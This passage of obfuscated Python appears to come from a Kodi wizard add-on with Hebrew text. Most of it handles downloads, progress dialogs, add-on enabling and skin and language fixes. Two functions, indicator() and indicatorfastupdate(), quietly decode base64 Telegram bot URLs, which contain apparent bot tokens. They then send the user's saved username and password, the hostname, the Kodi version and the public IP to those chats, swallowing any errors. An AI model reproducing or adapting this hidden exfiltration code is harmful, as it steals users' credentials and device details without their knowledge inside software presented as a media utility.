            pass #line:3483
           break #line:3484
        OOO000OO0O0O00O0O =float (OOOOOO0O0O000OO0O )/O0OOOOO000OOOO00O #line:3485
        OOO000OO0O0O00O0O =round (OOO000OO0O0O00O0O *100 ,2 )#line:3486
        O00OO0OO000O000OO =OOOOOO0O0O000OO0O /(1024 *1024 )#line:3487
        O000OOOOO0000OOO0 =O0OOOOO000OOOO00O /(1024 *1024 )#line:3488
        OOO0000OOOOO0O0O0 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O00OO0OO000O000OO ,'teal',O000OOOOO0000OOO0 )#line:3489
        if (time .time ()-O0OO00OOOO00O000O )>0 :#line:3490
          OO0OO0000O0OO0O00 =OOOOOO0O0O000OO0O /(time .time ()-O0OO00OOOO00O000O )#line:3491
          OO0OO0000O0OO0O00 =OO0OO0000O0OO0O00 /1024 #line:3492
        else :#line:3493
         OO0OO0000O0OO0O00 =0 #line:3494
        OO00OOOO000OOOOOO ='KB'#line:3495
        if OO0OO0000O0OO0O00 >=1024 :#line:3496
           OO0OO0000O0OO0O00 =OO0OO0000O0OO0O00 /1024 #line:3497
           OO00OOOO000OOOOOO ='MB'#line:3498
        if OO0OO0000O0OO0O00 >0 and not OOO000OO0O0O00O0O ==100 :#line:3499
            OOO0O0OOOOOO0OOOO =(O0OOOOO000OOOO00O -OOOOOO0O0O000OO0O )/OO0OO0000O0OO0O00 #line:3500
        else :#line:3501
            OOO0O0OOOOOO0OOOO =0 #line:3502
        O00O00000OOOOOO00 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OO0OO0000O0OO0O00 ,OO00OOOO000OOOOOO )#line:3503
        OOO00O0O00O00O00O .update (int (OOO000OO0O0O00O0O ),"Downloading "+name ,OOO0000OOOOO0O0O0 ,O00O00000OOOOOO00 )#line:3505
  OO0OOO0O0OOO000O0 =xbmc .translatePath (os .path .join ('special://home','addons'))#line:3508
  O000O00O000OO00O0 .close ()#line:3510
  extract (OO0O0OOOOO0OOOO0O ,OO0OOO0O0OOO000O0 ,OOO00O0O00O00O00O )#line:3512
  if os .path .exists (OO0OOO0O0OOO000O0 +'/scakemyer-script.quasar.burst'):#line:3513
    if os .path .exists (OO0OOO0O0OOO000O0 +'/script.quasar.burst'):#line:3514
     shutil .rmtree (OO0OOO0O0OOO000O0 +'/script.quasar.burst',ignore_errors =False )#line:3515
    os .rename (OO0OOO0O0OOO000O0 +'/scakemyer-script.quasar.burst',OO0OOO0O0OOO000O0 +'/script.quasar.burst')#line:3516
  if os .path .exists (OO0OOO0O0OOO000O0 +'/plugin.video.kmediatorrent-master'):#line:3518
    if os .path .exists (OO0OOO0O0OOO000O0 +'/plugin.video.kmediatorrent'):#line:3519
     shutil .rmtree (OO0OOO0O0OOO000O0 +'/plugin.video.kmediatorrent',ignore_errors =False )#line:3520
    os .rename (OO0OOO0O0OOO000O0 +'/plugin.video.kmediatorrent-master',OO0OOO0O0OOO000O0 +'/plugin.video.kmediatorrent')#line:3521
  xbmc .executebuiltin ('UpdateLocalAddons ')#line:3522
  xbmc .executebuiltin ("UpdateAddonRepos")#line:3523
  try :#line:3524
    os .remove (OO0O0OOOOO0OOOO0O )#line:3525
  except :#line:3526
    pass #line:3527
  OOO00O0O00O00O00O .close ()#line:3528
def dis_or_enable_addon (O000OOOOOO00OOO0O ,O000O0O0OO0O00OO0 ,enable ="true"):#line:3529
    import json #line:3530
    OOO0OOO0OO0O0O000 ='"%s"'%O000OOOOOO00OOO0O #line:3531
    if xbmc .getCondVisibility ("System.HasAddon(%s)"%O000OOOOOO00OOO0O )and enable =="true":#line:3532
        logging .warning ('already Enabled')#line:3533
        return xbmc .log ("### Skipped %s, reason = allready enabled"%O000OOOOOO00OOO0O )#line:3534
    elif not xbmc .getCondVisibility ("System.HasAddon(%s)"%O000OOOOOO00OOO0O )and enable =="false":#line:3535
        return xbmc .log ("### Skipped %s, reason = not installed"%O000OOOOOO00OOO0O )#line:3536
    else :#line:3537
        O00O00OOO0O00O0OO ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":%s,"enabled":%s}}'%(OOO0OOO0OO0O0O000 ,enable )#line:3538
        O000O0O000OOOOOOO =xbmc .executeJSONRPC (O00O00OOO0O00O0OO )#line:3539
        OOO0O0OO0OOOOO0O0 =json .loads (O000O0O000OOOOOOO )#line:3540
        if enable =="true":#line:3541
            xbmc .log ("### Enabled %s, response = %s"%(O000OOOOOO00OOO0O ,OOO0O0OO0OOOOO0O0 ))#line:3542
        else :#line:3543
            xbmc .log ("### Disabled %s, response = %s"%(O000OOOOOO00OOO0O ,OOO0O0OO0OOOOO0O0 ))#line:3544
    if O000O0O0OO0O00OO0 =='auto':#line:3545
     return True #line:3546
    return xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:3547
def chunk_report (OO0OO0O0OO0OO0000 ,O00O0O0OOO00OOOOO ,OO0000OO0OOO000OO ):#line:3548
   O0000OO00O0OOO0OO =float (OO0OO0O0OO0OO0000 )/OO0000OO0OOO000OO #line:3549
   O0000OO00O0OOO0OO =round (O0000OO00O0OOO0OO *100 ,2 )#line:3550
   if OO0OO0O0OO0OO0000 >=OO0000OO0OOO000OO :#line:3552
      sys .stdout .write ('\n')#line:3553
def chunk_read (OO0000O0OO0O0000O ,chunk_size =8192 ,report_hook =None ,dp =None ,destination ='',filesize =1000000 ):#line:3555
   import time #line:3556
   OO0O0000OOOOO0O00 =int (filesize )*1000000 #line:3557
   OO0OOO00000OOOOOO =0 #line:3559
   O0O0OOO0OOO0O0O0O =time .time ()#line:3560
   O0OOO0OOO0OO0OOO0 =0 #line:3561
   logging .warning ('Downloading')#line:3563
   with open (destination ,"wb")as OOO00OOOOOOOO0OOO :#line:3564
    while 1 :#line:3565
      OO000OOOO00OO0O00 =time .time ()-O0O0OOO0OOO0O0O0O #line:3566
      O0O0O00OO00000O00 =int (O0OOO0OOO0OO0OOO0 *chunk_size )#line:3567
      O00OO0O0O00OO0OOO =OO0000O0OO0O0000O .read (chunk_size )#line:3568
      OOO00OOOOOOOO0OOO .write (O00OO0O0O00OO0OOO )#line:3569
      OOO00OOOOOOOO0OOO .flush ()#line:3570
      OO0OOO00000OOOOOO +=len (O00OO0O0O00OO0OOO )#line:3571
      OOOO0000O0OO00O0O =float (OO0OOO00000OOOOOO )/OO0O0000OOOOO0O00 #line:3572
      OOOO0000O0OO00O0O =round (OOOO0000O0OO00O0O *100 ,2 )#line:3573
      if int (OO000OOOO00OO0O00 )>0 :#line:3574
        O0OOO0OO0OOOO00O0 =int (O0O0O00OO00000O00 /(1024 *OO000OOOO00OO0O00 ))#line:3575
      else :#line:3576
         O0OOO0OO0OOOO00O0 =0 #line:3577
      if O0OOO0OO0OOOO00O0 >1024 and not OOOO0000O0OO00O0O ==100 :#line:3578
          O000000OO0O0000O0 =int (((OO0O0000OOOOO0O00 -O0O0O00OO00000O00 )/1024 )/(O0OOO0OO0OOOO00O0 ))#line:3579
      else :#line:3580
          O000000OO0O0000O0 =0 #line:3581
      if O000000OO0O0000O0 <0 :#line:3582
        O000000OO0O0000O0 =0 #line:3583
      dp .update (int (OOOO0000O0OO00O0O ),name +"[B]מוריד: [/B]","\r%d%%,[COLOR aqua] %d MB / %d MB [/COLOR], %d KB/s "%(OOOO0000O0OO00O0O ,O0O0O00OO00000O00 /(1024 *1024 ),OO0O0000OOOOO0O00 /(1000 *1000 ),O0OOO0OO0OOOO00O0 ),'[COLOR aqua]%02d:%02d[/COLOR][B]זמן שנותר: [/B]'%divmod (O000000OO0O0000O0 ,60 ))#line:3584
      if dp .iscanceled ():#line:3585
         dp .close ()#line:3586
         break #line:3587
      if not O00OO0O0O00OO0OOO :#line:3588
         break #line:3589
      if report_hook :#line:3591
         report_hook (OO0OOO00000OOOOOO ,chunk_size ,OO0O0000OOOOO0O00 )#line:3592
      O0OOO0OOO0OO0OOO0 +=1 #line:3593
   logging .warning ('END Downloading')#line:3594
   return OO0OOO00000OOOOOO #line:3595
def googledrive_download (O000O0OO0OOO0OO00 ,O000OOOO000OO0O0O ,OO000O0OO0OOO000O ,OOO000000OO0OOOOO ):#line:3597
    OOOOO0O00O00OOOOO =[]#line:3601
    O0O0OOOO0000O000O =O000O0OO0OOO0OO00 .split ('=')#line:3602
    O000O0OO0OOO0OO00 =O0O0OOOO0000O000O [len (O0O0OOOO0000O000O )-1 ]#line:3603
    def O00OOOO000OOOOOOO (O00OOOO0OO0O0O0O0 ):#line:3605
        for OOO0OO00O00O000O0 in O00OOOO0OO0O0O0O0 :#line:3607
            logging .warning ('cookie.name')#line:3608
            logging .warning (OOO0OO00O00O000O0 .name )#line:3609
            O0OO0OO0O0OO000OO =OOO0OO00O00O000O0 .value #line:3610
            if 'download_warning'in OOO0OO00O00O000O0 .name :#line:3611
                logging .warning (OOO0OO00O00O000O0 .value )#line:3612
                logging .warning ('cookie.value')#line:3613
                return OOO0OO00O00O000O0 .value #line:3614
            return O0OO0OO0O0OO000OO #line:3615
        return None #line:3617
    def O0000OO00O0OO0OOO (OO00000000000O0O0 ,O0O000OO0O000O0O0 ):#line:3619
        O00O00O000O000000 =32768 #line:3621
        OOOOO0OO0O0OO000O =time .time ()#line:3622
        with open (O0O000OO0O000O0O0 ,"wb")as O0O0OO0O0OOO0O000 :#line:3624
            O0O0O000OOO00O000 =1 #line:3625
            OO0O0O0O0O000000O =32768 #line:3626
            try :#line:3627
                OOO0OO0OO00OOOOOO =int (OO00000000000O0O0 .headers .get ('content-length'))#line:3628
                print ('file total size :',OOO0OO0OO00OOOOOO )#line:3629
            except TypeError :#line:3630
                print ('using dummy length !!!')#line:3631
                OOO0OO0OO00OOOOOO =int (OOO000000OO0OOOOO )*1000000 #line:3632
            for O000O0OO0000O000O in OO00000000000O0O0 .iter_content (O00O00O000O000000 ):#line:3633
                if O000O0OO0000O000O :#line:3634
                    O0O0OO0O0OOO0O000 .write (O000O0OO0000O000O )#line:3635
                    O0O0OO0O0OOO0O000 .flush ()#line:3636
                    O0O00O00O0000OO0O =time .time ()-OOOOO0OO0O0OO000O #line:3637
                    O0O00OO0OOO000000 =int (O0O0O000OOO00O000 *OO0O0O0O0O000000O )#line:3638
                    if O0O00O00O0000OO0O ==0 :#line:3639
                        O0O00O00O0000OO0O =0.1 #line:3640
                    OO000OO00OOOOOO0O =int (O0O00OO0OOO000000 /(1024 *O0O00O00O0000OO0O ))#line:3641
                    OOO00OOOO000O00OO =int (O0O0O000OOO00O000 *OO0O0O0O0O000000O *100 /OOO0OO0OO00OOOOOO )#line:3642
                    if OO000OO00OOOOOO0O >1024 and not OOO00OOOO000O00OO ==100 :#line:3643
                      OO00O0O0000OOOOOO =int (((OOO0OO0OO00OOOOOO -O0O00OO0OOO000000 )/1024 )/(OO000OO00OOOOOO0O ))#line:3644
                    else :#line:3645
                      OO00O0O0000OOOOOO =0 #line:3646
                    OO000O0OO0OOO000O .update (int (OOO00OOOO000O00OO ),name ,"\r%d%%,[COLOR aqua] %d MB / %d MB [/COLOR], %d KB/s "%(OOO00OOOO000O00OO ,O0O00OO0OOO000000 /(1024 *1024 ),OOO0OO0OO00OOOOOO /(1000 *1000 ),OO000OO00OOOOOO0O ),'[B]ETA:[/B] [COLOR aqua]%02d:%02d[/COLOR]'%divmod (OO00O0O0000OOOOOO ,60 ))#line:3648
                    O0O0O000OOO00O000 +=1 #line:3649
                    if OO000O0OO0OOO000O .iscanceled ():#line:3650
                     OO000O0OO0OOO000O .close ()#line:3651
                     break #line:3652
    O00OO0OO0OOOO0OOO ="https://docs.google.com/uc?export=download"#line:3653
    import urllib2 #line:3658
    import cookielib #line:3659
    from cookielib import CookieJar #line:3661
    OO0OO0OOO0OO0O0O0 =CookieJar ()#line:3663
    O000O0000O000OOO0 =urllib2 .build_opener (urllib2 .HTTPCookieProcessor (OO0OO0OOO0OO0O0O0 ))#line:3664
    OOO00O0O0O00OO0OO ={'id':O000O0OO0OOO0OO00 }#line:3666
    OO00O00OO00OOOOOO =urllib .urlencode (OOO00O0O0O00OO0OO )#line:3667
    logging .warning (O00OO0OO0OOOO0OOO +'&'+OO00O00OO00OOOOOO )#line:3668
    O0OOOOO0OOOO00O0O =O000O0000O000OOO0 .open (O00OO0OO0OOOO0OOO +'&'+OO00O00OO00OOOOOO )#line:3669
    O000OOO0OOO000O00 =O0OOOOO0OOOO00O0O .read ()#line:3670
    for O0000OO0O000000O0 in OO0OO0OOO0OO0O0O0 :#line:3672
         logging .warning (O0000OO0O000000O0 )#line:3673
    OOOO00O00O0O00O00 =O00OOOO000OOOOOOO (OO0OO0OOO0OO0O0O0 )#line:3674
    logging .warning (OOOO00O00O0O00O00 )#line:3675
    if OOOO00O00O0O00O00 :#line:3676
        OO0O0000OO0000OOO ={'id':O000O0OO0OOO0OO00 ,'confirm':OOOO00O00O0O00O00 }#line:3677
        O00O0OOOOOOO0OO00 ={'Access-Control-Allow-Headers':'Content-Length'}#line:3678
        OO00O00OO00OOOOOO =urllib .urlencode (OO0O0000OO0000OOO )#line:3679
        O0OOOOO0OOOO00O0O =O000O0000O000OOO0 .open (O00OO0OO0OOOO0OOO +'&'+OO00O00OO00OOOOOO )#line:3680
        chunk_read (O0OOOOO0OOOO00O0O ,report_hook =chunk_report ,dp =OO000O0OO0OOO000O ,destination =O000OOOO000OO0O0O ,filesize =OOO000000OO0OOOOO )#line:3681
    return (OOOOO0O00O00OOOOO )#line:3685
def kodi17Fix ():#line:3686
	O0O00O00OO000O0O0 =glob .glob (os .path .join (ADDONS ,'*/'))#line:3687
	OOOO0O0O0O0O0O0O0 =[]#line:3688
	for OOOO00OO0O00O00O0 in sorted (O0O00O00OO000O0O0 ,key =lambda O0O0O00000O00000O :O0O0O00000O00000O ):#line:3689
		OOO0OO00OO00000OO =os .path .join (OOOO00OO0O00O00O0 ,'addon.xml')#line:3690
		if os .path .exists (OOO0OO00OO00000OO ):#line:3691
			O0O00OOO0OO0O0OO0 =OOOO00OO0O00O00O0 .replace (ADDONS ,'')[1 :-1 ]#line:3692
			OO0OOOOOO0O0O000O =open (OOO0OO00OO00000OO )#line:3693
			OOOO0OOO0O00000O0 =OO0OOOOOO0O0O000O .read ()#line:3694
			OO0O0O00O000OOO0O =parseDOM (OOOO0OOO0O00000O0 ,'addon',ret ='id')#line:3695
			OO0OOOOOO0O0O000O .close ()#line:3696
			try :#line:3697
				OO000O0000O000O00 =xbmcaddon .Addon (id =OO0O0O00O000OOO0O [0 ])#line:3698
			except :#line:3699
				try :#line:3700
					log ("%s was disabled"%OO0O0O00O000OOO0O [0 ],xbmc .LOGDEBUG )#line:3701
					OOOO0O0O0O0O0O0O0 .append (OO0O0O00O000OOO0O [0 ])#line:3702
				except :#line:3703
					try :#line:3704
						log ("%s was disabled"%O0O00OOO0OO0O0OO0 ,xbmc .LOGDEBUG )#line:3705
						OOOO0O0O0O0O0O0O0 .append (O0O00OOO0OO0O0OO0 )#line:3706
					except :#line:3707
						if len (OO0O0O00O000OOO0O )==0 :log ("Unabled to enable: %s(Cannot Determine Addon ID)"%O0O00OOO0OO0O0OO0 ,xbmc .LOGERROR )#line:3708
						else :log ("Unabled to enable: %s"%OOOO00OO0O00O00O0 ,xbmc .LOGERROR )#line:3709
	if len (OOOO0O0O0O0O0O0O0 )>0 :#line:3710
		OO00000000O00OOO0 =0 #line:3711
		DP .create (ADDONTITLE ,'[COLOR %s]Enabling disabled Addons'%COLOR2 ,'','Please Wait[/COLOR]')#line:3712
		for OO0O00O0OO0O00O0O in OOOO0O0O0O0O0O0O0 :#line:3713
			OO00000000O00OOO0 +=1 #line:3714
			OOO0000OOOOOOO0O0 =int (percentage (OO00000000O00OOO0 ,len (OOOO0O0O0O0O0O0O0 )))#line:3715
			DP .update (OOO0000OOOOOOO0O0 ,"","Enabling: [COLOR %s]%s[/COLOR]"%(COLOR1 ,OO0O00O0OO0O00O0O ))#line:3716
			addonDatabase (OO0O00O0OO0O00O0O ,1 )#line:3717
			if DP .iscanceled ():break #line:3718
		if DP .iscanceled ():#line:3719
			DP .close ()#line:3720
			LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Enabling Addons Cancelled![/COLOR]"%COLOR2 )#line:3721
			sys .exit ()#line:3722
		DP .close ()#line:3723
	forceUpdate ()#line:3724
def indicator ():#line:3726
       try :#line:3727
          import json #line:3728
          wiz .log ('FRESH MESSAGE')#line:3729
          OOOO0000O000OOOOO =(ADDON .getSetting ("user"))#line:3730
          OOO0OO000OO0O0OO0 =(ADDON .getSetting ("pass"))#line:3731
          O0OOO0O00O00OO0O0 =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:3732
          O00O00OOO0O0O0OOO ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDc1MDEwMDI1NjpBQUVJVnpTSndOM2t6T25EV0F3Yi1LTkk3VUREY2N6aEx6VS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0xMDAxNDE1ODcxNzk3JnRleHQ915TXqten15nXnyDXkNeqINeU15HXmdec15Mg16nXnNeaIA=='#line:3733
          O0OOOO00000O0O0OO =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:3734
          OOOOOO0OOOOO00OOO =str (json .loads (O0OOOO00000O0O0OO )['ip'])#line:3735
          O0OOOO0OO0OO0O0OO =OOOO0000O000OOOOO #line:3736
          O0OO00OO00OO0OO0O =OOO0OO000OO0O0OO0 #line:3737
          import socket #line:3738
          O0OOOO00000O0O0OO =urllib2 .urlopen (O00O00OOO0O0O0OOO .decode ('base64')+' - '+(socket .gethostbyaddr (socket .gethostname ())[0 ])+' - '+O0OOOO0OO0OO0O0OO +' - '+O0OO00OO00OO0OO0O +' - '+O0OOO0O00O00OO0O0 +' - '+OOOOOO0OOOOO00OOO ).readlines ()#line:3739
       except :pass #line:3741
def indicatorfastupdate ():#line:3743
       try :#line:3744
          import json #line:3745
          wiz .log ('FRESH MESSAGE')#line:3746
          OOO0O0O00O0O0OO0O =(ADDON .getSetting ("user"))#line:3747
          OOO000O0O0OOOOO00 =(ADDON .getSetting ("pass"))#line:3748
          O0OO0OO0O0OOO0000 =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:3749
          OO00O00OO00000000 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0yNzQyNjIzODkmdGV4dD0g16LXqdeUINei15PXm9eV158g157XlNeZ16gg'#line:3751
          O000O0O0000O0OOO0 =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:3752
          O0O0O00O00O00O00O =str (json .loads (O000O0O0000O0OOO0 )['ip'])#line:3753
          OO0000OOOOO00OOOO =OOO0O0O00O0O0OO0O #line:3754
          O000O0O0O000OO00O =OOO000O0O0OOOOO00 #line:3755
          import socket #line:3757
          O000O0O0000O0OOO0 =urllib2 .urlopen (OO00O00OO00000000 .decode ('base64')+' - '+(socket .gethostbyaddr (socket .gethostname ())[0 ])+' - '+OO0000OOOOO00OOOO +' - '+O000O0O0O000OO00O +' - '+O0OO0OO0O0OOO0000 +' - '+O0O0O00O00O00O00O ).readlines ()#line:3758
       except :pass #line:3760
def skinfix18 ():#line:3762
	if KODIV >=18 and os .path .exists (os .path .join (ADDONS ,SKINID18 )):#line:3763
		O0O0OO0O000OOOO00 =wiz .workingURL (SKINID18DDONXML )#line:3764
		if O0O0OO0O000OOOO00 ==True :#line:3765
			O0OO0O0OO000OO00O =wiz .parseDOM (wiz .openURL (SKINID18DDONXML ),'addon',ret ='version',attrs ={'id':SKINID18 })#line:3766
			if len (O0OO0O0OO000OO00O )>0 :#line:3767
				O00OOOOO00O000O00 ='%s-%s.zip'%(SKINID18 ,O0OO0O0OO000OO00O [0 ])#line:3768
				O0000O0OOOO00O0OO =wiz .workingURL (SKIN18ZIPURL +O00OOOOO00O000O00 )#line:3769
				if O0000O0OOOO00O0OO ==True :#line:3770
					DP .create (ADDONTITLE ,'מתאים את הסקין לקודי שלך, אנא המתן....','','Please Wait')#line:3771
					if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3772
					O00O00O00O0OOO000 =os .path .join (PACKAGES ,O00OOOOO00O000O00 )#line:3773
					try :os .remove (O00O00O00O0OOO000 )#line:3774
					except :pass #line:3775
					downloader .download (SKIN18ZIPURL +O00OOOOO00O000O00 ,O00O00O00O0OOO000 ,DP )#line:3776
					extract .all (O00O00O00O0OOO000 ,HOME ,DP )#line:3777
					try :#line:3778
						O0O0000O00O000O00 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos107.db")#line:3779
						O00O00OO00OOOO0OO =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db")#line:3780
						os .rename (O0O0000O00O000O00 ,O00O00OO00OOOO0OO )#line:3781
					except :#line:3782
						pass #line:3783
					try :#line:3784
						O0OO000OO0OO0O00O =open (os .path .join (ADDONS ,SKINID18 ,'addon.xml'),mode ='r');O000O00OOO00OOOOO =O0OO000OO0OO0O00O .read ();O0OO000OO0OO0O00O .close ()#line:3785
						O0OOOOOO0OOO0OO0O =wiz .parseDOM (O000O00OOO00OOOOO ,'addon',ret ='name',attrs ={'id':SKINID18 })#line:3786
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0OOOOOO0OOO0OO0O [0 ]),"[COLOR %s]Add-on updated[/COLOR]"%COLOR2 ,icon =os .path .join (ADDONS ,SKINID18 ,'icon.png'))#line:3787
					except :#line:3788
						pass #line:3789
					if KODIV >=17 :wiz .addonDatabase (SKINID18 ,1 )#line:3790
					DP .close ()#line:3791
					xbmc .sleep (500 )#line:3792
					wiz .forceUpdate (True )#line:3793
					wiz .log ("[Auto Install Repo] Successfully Installed",xbmc .LOGNOTICE )#line:3794
				else :#line:3795
					wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid url for zip![/COLOR]"%COLOR2 )#line:3796
					wiz .log ("[Auto Install Repo] Was unable to create a working url for repository. %s"%O0000O0OOOO00O0OO ,xbmc .LOGERROR )#line:3797
			else :#line:3798
				wiz .log ("Invalid URL for Repo Zip",xbmc .LOGERROR )#line:3799
		else :#line:3800
			wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid addon.xml file![/COLOR]"%COLOR2 )#line:3801
			wiz .log ("[Auto Install Repo] Unable to read the addon.xml file.",xbmc .LOGERROR )#line:3802
def skinfix17 ():#line:3803
	if KODIV >=17 and KODIV <18 and os .path .exists (os .path .join (ADDONS ,SKINID17 )):#line:3804
		OOOO0O0O0OOOOO0OO =wiz .workingURL (SKINID17DDONXML )#line:3805
		if OOOO0O0O0OOOOO0OO ==True :#line:3806
			OOO000OOOOOO00O0O =wiz .parseDOM (wiz .openURL (SKINID17DDONXML ),'addon',ret ='version',attrs ={'id':SKINID17 })#line:3807
			if len (OOO000OOOOOO00O0O )>0 :#line:3808
				O0OO0O00O00000000 ='%s-%s.zip'%(SKINID17 ,OOO000OOOOOO00O0O [0 ])#line:3809
				OOOOO0OOO000O0O0O =wiz .workingURL (SKIN17ZIPURL +O0OO0O00O00000000 )#line:3810
				if OOOOO0OOO000O0O0O ==True :#line:3811
					DP .create (ADDONTITLE ,'מתאים את הסקין לקודי שלך, אנא המתן....','','Please Wait')#line:3812
					if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3813
					O0O000OO0OOO0O0O0 =os .path .join (PACKAGES ,O0OO0O00O00000000 )#line:3814
					try :os .remove (O0O000OO0OOO0O0O0 )#line:3815
					except :pass #line:3816
					downloader .download (SKIN17ZIPURL +O0OO0O00O00000000 ,O0O000OO0OOO0O0O0 ,DP )#line:3817
					extract .all (O0O000OO0OOO0O0O0 ,HOME ,DP )#line:3818
					try :#line:3819
						O0OO0000000OO000O =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db")#line:3820
						OOOOOO00OOO0O000O =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos107.db")#line:3821
						os .rename (O0OO0000000OO000O ,OOOOOO00OOO0O000O )#line:3822
					except :#line:3823
						pass #line:3824
					try :#line:3825
						O00000O00OOO0000O =open (os .path .join (ADDONS ,SKINID17 ,'addon.xml'),mode ='r');OOO0000O0OO0O00OO =O00000O00OOO0000O .read ();O00000O00OOO0000O .close ()#line:3826
						O00O0O00OOO0O0O00 =wiz .parseDOM (OOO0000O0OO0O00OO ,'addon',ret ='name',attrs ={'id':SKINID17 })#line:3827
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,O00O0O00OOO0O0O00 [0 ]),"[COLOR %s]Add-on updated[/COLOR]"%COLOR2 ,icon =os .path .join (ADDONS ,SKINID17 ,'icon.png'))#line:3828
					except :#line:3829
						pass #line:3830
					if KODIV >=17 :wiz .addonDatabase (SKINID17 ,1 )#line:3831
					DP .close ()#line:3832
					xbmc .sleep (500 )#line:3833
					wiz .forceUpdate (True )#line:3834
					wiz .log ("[Auto Install Repo] Successfully Installed",xbmc .LOGNOTICE )#line:3835
				else :#line:3836
					wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid url for zip![/COLOR]"%COLOR2 )#line:3837
					wiz .log ("[Auto Install Repo] Was unable to create a working url for repository. %s"%OOOOO0OOO000O0O0O ,xbmc .LOGERROR )#line:3838
			else :#line:3839
				wiz .log ("Invalid URL for Repo Zip",xbmc .LOGERROR )#line:3840
		else :#line:3841
			wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid addon.xml file![/COLOR]"%COLOR2 )#line:3842
			wiz .log ("[Auto Install Repo] Unable to read the addon.xml file.",xbmc .LOGERROR )#line:3843
def fix17update ():#line:3844
	if KODIV >=17 and KODIV <18 :#line:3845
		wiz .kodi17Fix ()#line:3846
		xbmc .sleep (4000 )#line:3847
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')#line:3848
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')#line:3849
		fixfont ()#line:3850
		OOOO000000OO0000O =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:3851
		try :#line:3853
			OOO0O00000O000O0O =open (OOOO000000OO0000O ,'r')#line:3854
			OOOO0000O0O00O0OO =OOO0O00000O000O0O .read ()#line:3855
			OOO0O00000O000O0O .close ()#line:3856
			O0O0000O0O0O0O0O0 ='<import addon="xbmc.gui" version="5.14.0(.+?)/>'#line:3857
			OOO0O00O00OO0O0OO =re .compile (O0O0000O0O0O0O0O0 ).findall (OOOO0000O0O00O0OO )[0 ]#line:3858
			OOO0O00000O000O0O =open (OOOO000000OO0000O ,'w')#line:3859
			OOO0O00000O000O0O .write (OOOO0000O0O00O0OO .replace ('<import addon="xbmc.gui" version="5.14.0%s/>'%OOO0O00O00OO0O0OO ,'<import addon="xbmc.gui" version="5.12.0"/>'))#line:3860
			OOO0O00000O000O0O .close ()#line:3861
		except :#line:3862
				pass #line:3863
		wiz .kodi17Fix ()#line:3864
		OOOO000000OO0000O =os .path .join (xbmc .translatePath ("special://userdata"),"guisettings.xml")#line:3865
		try :#line:3866
			OOO0O00000O000O0O =open (OOOO000000OO0000O ,'r')#line:3867
			OOOO0000O0O00O0OO =OOO0O00000O000O0O .read ()#line:3868
			OOO0O00000O000O0O .close ()#line:3869
			O0O0000O0O0O0O0O0 ='<keyboardlayouts default="true(.+?)/keyboardlayouts>'#line:3870
			OOO0O00O00OO0O0OO =re .compile (O0O0000O0O0O0O0O0 ).findall (OOOO0000O0O00O0OO )[0 ]#line:3871
			OOO0O00000O000O0O =open (OOOO000000OO0000O ,'w')#line:3872
			OOO0O00000O000O0O .write (OOOO0000O0O00O0OO .replace ('<keyboardlayouts default="true%s/keyboardlayouts>'%OOO0O00O00OO0O0OO ,'<keyboardlayouts>English QWERTY|Hebrew QWERTY</keyboardlayouts>'))#line:3873
			OOO0O00000O000O0O .close ()#line:3874
		except :#line:3875
				pass #line:3876
		swapSkins ('skin.Premium.mod')#line:3877
def fix18update ():#line:3879
	if KODIV >=18 :#line:3880
		xbmc .sleep (4000 )#line:3881
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')#line:3882
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')#line:3883
		fixfont ()#line:3884
		O000O0OOOOO0O0O00 =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:3885
		try :#line:3886
			OO00O0OO0O000OO00 =open (O000O0OOOOO0O0O00 ,'r')#line:3887
			O00O0OO00O00OOO0O =OO00O0OO0O000OO00 .read ()#line:3888
			OO00O0OO0O000OO00 .close ()#line:3889
			OOOO000O0OOO00O00 ='<import addon="xbmc.gui" version="5.12.0(.+?)/>'#line:3890
